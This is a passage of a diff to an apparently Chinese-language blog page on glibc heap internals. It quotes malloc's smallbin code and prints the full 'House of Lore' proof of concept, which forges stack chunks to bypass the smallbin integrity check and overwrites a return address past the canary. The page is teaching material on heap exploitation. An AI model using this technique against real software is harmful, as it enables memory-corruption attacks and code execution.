+          <span class="token keyword">while</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator"><</span> mp_<span class="token punctuation">.</span>tcache_count
+             <span class="token operator">&&</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+              bck <span class="token operator">=</span> tc_victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
+              <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+              <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&</span>main_arena<span class="token punctuation">)</span>
+            <span class="token function">set_non_main_arena</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+              bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
+              bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>
+
+              <span class="token function">tcache_put</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+<span class="token macro property">#<span class="token directive keyword">endif</span></span>
+          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">return</span> p<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>其中最主要的为</p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//获取victim的上一个chunk</span>
+          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
+          <span class="token comment" spellcheck="true">//如果victim上一个chunk的fd指针没有指向victim则程序报错</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): smallbin double linked list corrupted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>如果glibc没有保护的话 只要修改释放后的chunk的fd指针 就可以向bin中任意添加chunk 但是现实总是残酷的 虽然glibc加的有防护 但是实际上是很好绕过的 它仅仅验证了 <code>victim->bk->fd=victim</code> 实际上这是很好伪造出来的 那么实例代码如下</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdint.h></span></span>
+
+<span class="token keyword">void</span> <span class="token function">jackpot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Nice jump d00d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+
+  intptr_t<span class="token operator">*</span> stack_buffer_1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+  intptr_t<span class="token operator">*</span> stack_buffer_2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nWelcome to the House of Lore\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating the victim chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  intptr_t <span class="token operator">*</span>victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the first small chunk on the heap at %p\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment" spellcheck="true">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span>
+  intptr_t <span class="token operator">*</span>victim_chdunk <span class="token operator">=</span> victim<span class="token number">-2</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_1 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_2 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Create a fake chunk on the stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span>
+         <span class="token string">"in second to the last malloc, which putting stack address on smallbin list\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  stack_buffer_1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  stack_buffer_1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  stack_buffer_1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> victim_chunk<span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span>
+         <span class="token string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span>
+         <span class="token string">"chunk on stack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  stack_buffer_1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">;</span>
+  stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span>
+         <span class="token string">"the small one during the free()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the large chunk on the heap at %p\n"</span><span class="token punctuation">,</span> p5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">void</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment" spellcheck="true">//------------VULNERABILITY-----------</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// victim->bk is pointing to stack</span>
+
+  <span class="token comment" spellcheck="true">//------------------------------------</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now allocating a chunk with size equal to the first one freed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">void</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = malloc(100)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span><span class="token punctuation">,</span>
+         stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\np4 is %p and should be on the stack!\n"</span><span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this chunk will be allocated on stack</span>
+  intptr_t sc <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>jackpot<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Emulating our in-memory shellcode</span>
+  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p4<span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&</span>sc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This bypasses stack-smash detection since it jumps over the canary</span>
+<span class="token punctuation">}</span><span class="token operator"><</span><span class="token operator">/</span>stdint<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>string<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<p>至于需要伪造两个chunk的原因是 当<code>stack_buffer_1</code>这个chunk被<code>malloc</code>的时候 会执行上述的检验流程 来检验他的<code>stack_buffer_1->bk->=stack_buffer_1</code> 所以需要伪造一个在stack_buffer_1之前的chunk来绕过检验</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -778,7 +972,7 @@ uint64_t <span class="token operator">*</span>chunk0_ptr<span class="token punct
             });
             document.body.appendChild(img);
           });
-      </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><!--128kb的时候--><p></p><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
+      </script>
             </div>
             <hr>
 
@@ -996,8 +1190,7 @@ uint64_t <span class="token operator">*</span>chunk0_ptr<span class="token punct
                     <div class="summary block-with-text">
                         
                             堆的基础知识堆是如何分配的在内存中堆有两种分配方式 一种是mmap另外一种是brk 这两者的区别是
-mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆块sizefd     BK=p->bk
-FD->bk=
+mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆块size<128kb的时候 使用brk分配
                         
                     </div>
                     <div class="publish-info">
@@ -1196,7 +1389,7 @@ FD->bk=
             | Theme <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
-             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">22k</span> 字
+             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">26.4k</span> 字
             
             
             
